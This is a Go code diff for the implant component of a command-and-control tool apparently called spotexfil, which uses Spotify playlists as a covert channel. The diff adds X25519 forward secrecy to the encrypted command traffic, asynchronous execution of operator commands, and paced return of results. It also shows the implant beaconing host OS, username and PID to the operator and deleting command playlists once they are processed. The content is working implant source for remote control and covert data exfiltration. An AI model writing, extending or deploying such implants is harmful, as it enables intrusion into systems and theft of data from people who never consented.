@@ -2,6 +2,7 @@ package c2
 
 import (
 	"context"
+	"crypto/ecdh"
 	"crypto/hmac"
 	crand "crypto/rand"
 	"crypto/sha256"
@@ -14,24 +15,36 @@ import (
 	"os"
 	"runtime"
 	"strings"
+	"sync"
 	"time"
 
+	"github.com/sourcefrenchy/spotexfil/internal/crypto"
 	"github.com/sourcefrenchy/spotexfil/internal/protocol"
 	"github.com/sourcefrenchy/spotexfil/internal/spotify"
 )
 
 // Implant polls for commands and executes them.
 type Implant struct {
-	client            *spotify.Client
-	key               string
-	interval          int
-	jitter            int
-	processedSeqs     map[int]bool
-	checkinPending    bool
-	readFails         int // consecutive READ failures (polling)
-	writeFails        int // consecutive WRITE failures (checkin/results)
-	sessionID         string
-	clientID          string
+	client         *spotify.Client
+	key            string
+	interval       int
+	jitter         int
+	processedSeqs  map[int]bool
+	checkinPending bool
+	readFails      int // consecutive READ failures (polling)
+	writeFails     int // consecutive WRITE failures (checkin/results)
+	sessionID      string
+	clientID       string
+
+	// Async result delivery
+	resultCh chan *protocol.C2Message
+	seqMu    sync.Mutex
+	wg       sync.WaitGroup
+
+	// Forward secrecy via X25519
+	ephPriv    *ecdh.PrivateKey
+	ephPub     *ecdh.PublicKey
+	sessionKey []byte // derived ECDH session key (nil until key exchange)
 }
 
 // NewImplant creates a new implant.
@@ -51,6 +64,19 @@ func NewImplant(client *spotify.Client, key string, interval, jitter int) *Impla
 	sessionID := fmt.Sprintf("%x", sessionBytes)
 	clientID := getClientID(key)
 
+	// Generate X25519 ephemeral key pair for forward secrecy
+	ephPriv, err := crypto.GenerateX25519()
+	if err != nil {
+		fmt.Printf("[!] Failed to generate X25519 keypair: %v\n", err)
+		fmt.Println("[!] Forward secrecy will not be available")
+	}
+
+	var ephPub *ecdh.PublicKey
+	if ephPriv != nil {
+		ephPub = ephPriv.PublicKey()
+		fmt.Printf("[*] X25519 pubkey: %s\n", hex.EncodeToString(ephPub.Bytes()))
+	}
+
 	fmt.Printf("[*] Polling every %d-%ds\n", interval-jitter, interval+jitter)
 	fmt.Printf("[*] Session: %s\n", sessionID[:12])
 	return &Implant{
@@ -61,6 +87,9 @@ func NewImplant(client *spotify.Client, key string, interval, jitter int) *Impla
 		processedSeqs: make(map[int]bool),
 		sessionID:     sessionID,
 		clientID:      clientID,
+		resultCh:      make(chan *protocol.C2Message, 32),
+		ephPriv:       ephPriv,
+		ephPub:        ephPub,
 	}
 }
 
@@ -93,6 +122,15 @@ func getClientID(encryptionKey string) string {
 	return hex.EncodeToString(h.Sum(nil))[:16]
 }
 
+// currentKey returns the session key (hex-encoded) if forward secrecy
+// has been established, or falls back to the master key.
+func (imp *Implant) currentKey() string {
+	if imp.sessionKey != nil {
+		return hex.EncodeToString(imp.sessionKey)
+	}
+	return imp.key
+}
+
 // sendCheckin sends a check-in beacon so the operator knows we connected.
 func (imp *Implant) sendCheckin() {
 	ctx := context.Background()
@@ -110,6 +148,11 @@ func (imp *Implant) sendCheckin() {
 		"os":         runtime.GOOS + "/" + runtime.GOARCH,
 		"user":       username,
 		"pid":        os.Getpid(),
+	}
+
+	// Include X25519 public key for forward secrecy negotiation
+	if imp.ephPub != nil {
+		checkinData["pubkey"] = hex.EncodeToString(imp.ephPub.Bytes())
 	}
 
 	dataBytes, _ := json.Marshal(checkinData)
@@ -240,10 +283,22 @@ func handleAPIError(err error, context string) int {
 	return 0
 }
 
+// resultWriter drains the result channel and sends results with pacing.
+func (imp *Implant) resultWriter() {
+	ctx := context.Background()
+	for result := range imp.resultCh {
+		imp.sendResult(ctx, result)
+		time.Sleep(2 * time.Second) // pacing
+	}
+}
+
 // Run starts the main polling loop.
 func (imp *Implant) Run() {
 	fmt.Println("[*] Implant started, polling for commands...")
 	imp.sendCheckin()
+
+	// Start async result writer
+	go imp.resultWriter()
 
 	writeBackoffUntil := time.Time{} // when to retry writes
 
@@ -252,7 +307,7 @@ func (imp *Implant) Run() {
 		if imp.checkinPending && time.Now().After(writeBackoffUntil) {
 			imp.sendCheckin()
 			if imp.checkinPending {
-				// Write failed again — exponential backoff for writes only
+				// Write failed again -- exponential backoff for writes only
 				imp.writeFails++
 				backoff := 60 * (1 << (imp.writeFails - 1))
 				if backoff > 600 {
@@ -269,7 +324,7 @@ func (imp *Implant) Run() {
 			}
 		}
 
-		// Always poll for commands (READ) — independent of write state
+		// Always poll for commands (READ) -- independent of write state
 		imp.pollAndExecute()
 
 		// Sleep with jitter (based on READ failures only)
@@ -310,7 +365,7 @@ func (imp *Implant) pollAndExecute() {
 				time.Sleep(time.Duration(retryAfter) * time.Second)
 				imp.readFails = 0 // reset after honoring the wait
 			} else {
-				// No Retry-After parsed — only log first occurrence
+				// No Retry-After parsed -- only log first occurrence
 				if imp.readFails <= 1 {
 					fmt.Printf("[!] Rate limited at %s, backing off\n",
 						time.Now().Format("15:04:05"))
@@ -329,14 +384,26 @@ func (imp *Implant) pollAndExecute() {
 	}
 
 	for seqNum, chunkMetas := range seqGroups {
-		if imp.processedSeqs[seqNum] {
+		imp.seqMu.Lock()
+		alreadyProcessed := imp.processedSeqs[seqNum]
+		imp.seqMu.Unlock()
+
+		if alreadyProcessed {
 			_ = imp.client.CleanC2Playlists(ctx,
 				protocol.ChannelCmd, imp.key, seqNum)
 			continue
 		}
 
 		payload := protocol.ReassemblePayload(chunkMetas)
-		cmdDict, err := protocol.DecodeMessage(payload, imp.key)
+
+		// Try session key first (forward secrecy), fall back to master key
+		var cmdDict map[string]interface{}
+		if imp.sessionKey != nil {
+			cmdDict, err = protocol.DecodeMessageRaw(payload, imp.sessionKey)
+		}
+		if cmdDict == nil {
+			cmdDict, err = protocol.DecodeMessage(payload, imp.key)
+		}
 		if err != nil {
 			errStr := strings.ToLower(err.Error())
 			if strings.Contains(errStr, "tag") || strings.Contains(errStr, "decrypt") || strings.Contains(errStr, "cipher") {
@@ -351,7 +418,7 @@ func (imp *Implant) pollAndExecute() {
 
 		msg := protocol.FromCommandMap(cmdDict)
 
-		// Validate timestamp — reject stale commands (replay protection)
+		// Validate timestamp -- reject stale commands (replay protection)
 		age := math.Abs(float64(time.Now().Unix()) - msg.Ts)
 		if age > 300 {
 			fmt.Printf("[!] Stale command rejected (seq=%d, age=%.0fs)\n", seqNum, age)
@@ -360,7 +427,7 @@ func (imp *Implant) pollAndExecute() {
 			continue
 		}
 
-		// Validate session ID — reject commands from stale sessions
+		// Validate session ID -- reject commands from stale sessions
 		if msg.SessionID != "" && msg.SessionID != imp.sessionID {
 			_ = imp.client.CleanC2Playlists(ctx,
 				protocol.ChannelCmd, imp.key, seqNum)
@@ -375,20 +442,90 @@ func (imp *Implant) pollAndExecute() {
 				time.Now().Format("15:04:05"))
 			fmt.Println("\033[33m[!] Session terminated. Waiting for new operator...\033[0m")
 			fmt.Println("\033[33m[!] Restart implant for a new session key.\033[0m")
-			// Reset state — stop executing, wait for restart
+			// Reset state -- stop executing, wait for restart
 			imp.checkinPending = true
+			imp.seqMu.Lock()
 			imp.processedSeqs = make(map[int]bool)
+			imp.seqMu.Unlock()
+			imp.sessionKey = nil // reset forward secrecy
+			continue
+		}
+
+		// Handle key exchange for forward secrecy
+		if msg.Module == "keyexchange" {
+			_ = imp.client.CleanC2Playlists(ctx,
+				protocol.ChannelCmd, imp.key, seqNum)
+			imp.handleKeyExchange(msg)
+			imp.seqMu.Lock()
+			imp.processedSeqs[seqNum] = true
+			imp.seqMu.Unlock()
 			continue
 		}
 
 		fmt.Printf("[*] Executing seq=%d module=%s\n", seqNum, msg.Module)
 
-		result := imp.execute(msg)
-		imp.sendResult(ctx, result)
+		// Async execution: dispatch to goroutine, send result via channel
+		imp.wg.Add(1)
+		go func(m *protocol.C2Message) {
+			defer imp.wg.Done()
+			result := imp.execute(m)
+			imp.resultCh <- result
+		}(msg)
+
 		_ = imp.client.CleanC2Playlists(ctx,
 			protocol.ChannelCmd, imp.key, seqNum)
+		imp.seqMu.Lock()
 		imp.processedSeqs[seqNum] = true
+		imp.seqMu.Unlock()
 	}
+}
+
+// handleKeyExchange processes a keyexchange command from the operator.
+func (imp *Implant) handleKeyExchange(msg *protocol.C2Message) {
+	if imp.ephPriv == nil {
+		fmt.Println("[!] Key exchange failed: no ephemeral key available")
+		return
+	}
+
+	// Extract operator's public key from pubkey field or args
+	peerPubHex := msg.PubKey
+	if peerPubHex == "" {
+		if pk, ok := msg.Args["pubkey"].(string); ok {
+			peerPubHex = pk
+		}
+	}
+	if peerPubHex == "" {
+		fmt.Println("[!] Key exchange failed: no peer public key")
+		return
+	}
+
+	peerPubBytes, err := hex.DecodeString(peerPubHex)
+	if err != nil {
+		fmt.Printf("[!] Key exchange failed: invalid pubkey hex: %v\n", err)
+		return
+	}
+
+	peerPub, err := ecdh.X25519().NewPublicKey(peerPubBytes)
+	if err != nil {
+		fmt.Printf("[!] Key exchange failed: invalid X25519 pubkey: %v\n", err)
+		return
+	}
+
+	shared, err := imp.ephPriv.ECDH(peerPub)
+	if err != nil {
+		fmt.Printf("[!] Key exchange failed: ECDH: %v\n", err)
+		return
+	}
+
+	sessionKey, err := crypto.DeriveSessionKey(shared, imp.key)
+	if err != nil {
+		fmt.Printf("[!] Key exchange failed: key derivation: %v\n", err)
+		return
+	}
+
+	imp.sessionKey = sessionKey
+	fmt.Printf("[*] Forward secrecy established at %s\n",
+		time.Now().Format("15:04:05"))
 }
 
 func (imp *Implant) execute(msg *protocol.C2Message) *protocol.C2Message {
@@ -414,7 +551,14 @@ func (imp *Implant) execute(msg *protocol.C2Message) *protocol.C2Message {
 }
 
 func (imp *Implant) sendResult(ctx context.Context, result *protocol.C2Message) {
-	encoded, err := protocol.EncodeMessage(result.ToResultMap(), imp.key)
+	// Use session key for encoding if forward secrecy is established
+	var encoded string
+	var err error
+	if imp.sessionKey != nil {
+		encoded, err = protocol.EncodeMessageRaw(result.ToResultMap(), imp.sessionKey)
+	} else {
+		encoded, err = protocol.EncodeMessage(result.ToResultMap(), imp.key)
+	}
 	if err != nil {
 		fmt.Printf("[!] Failed to encode result seq=%d: %v\n", result.Seq, err)
 		return
